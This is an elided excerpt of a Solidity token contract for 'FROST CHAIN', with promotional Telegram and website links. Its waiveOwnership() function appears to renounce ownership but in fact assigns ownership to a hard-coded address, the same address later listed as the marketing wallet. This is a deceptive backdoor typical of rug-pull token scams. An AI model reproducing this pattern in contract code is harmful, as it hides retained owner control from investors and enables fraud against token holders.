...
//BLOCKCHAIN LAYER 1//
//HIGH-PERFORFMANCE BLOCKCHAIN//

//Telegram https://t.me/frostchain
//Website https://frost-chain.com
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x77A76aCDA7185F572BDE4C662bB78f05bBDE1b03);
    }
...
contract FROSTCHAIN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "FROST CHAIN";
    string private _symbol = "FROST";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x77A76aCDA7185F572BDE4C662bB78f05bBDE1b03);
    address payable public teamWalletAddress = payable(0xD75DB797c5EF4F04b6AF4Dc713cD8707442806c6);
